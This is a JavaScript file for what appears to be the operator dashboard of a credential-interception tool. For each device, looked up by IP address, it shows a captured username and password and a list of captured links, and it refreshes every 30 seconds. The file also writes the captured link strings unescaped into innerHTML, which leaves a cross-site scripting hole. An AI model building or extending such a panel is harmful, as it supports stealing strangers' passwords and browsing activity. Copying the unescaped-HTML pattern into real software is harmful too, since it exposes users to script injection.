// static/js/devices.js
function loadDeviceInfo() {
    const ipAddress = window.location.pathname.split('/').pop();
    fetch(`/api/device-info/${ipAddress}`)
        .then(response => response.json())
        .then(info => {
            document.getElementById('deviceIp').textContent = info.device_ip;
            document.getElementById('username').textContent = info.username || 'Not captured';
            document.getElementById('password').textContent = info.password || 'Not captured';
            
            const linksList = document.getElementById('linksList');
            linksList.innerHTML = '';
            
            if (info.links) {
                info.links.split('\n').forEach(link => {
                    if (link.trim()) {
                        const li = document.createElement('li');
                        li.className = 'mb-2';
                        li.innerHTML = `<a href="${link}" target="_blank" class="text-blue-600 hover:text-blue-800">${link}</a>`;
                        linksList.appendChild(li);
                    }
                });
            } else {
                linksList.innerHTML = '<li>No links captured</li>';
            }
        });
}

// Initial load and periodic refresh
loadDeviceInfo();
setInterval(loadDeviceInfo, 30000);

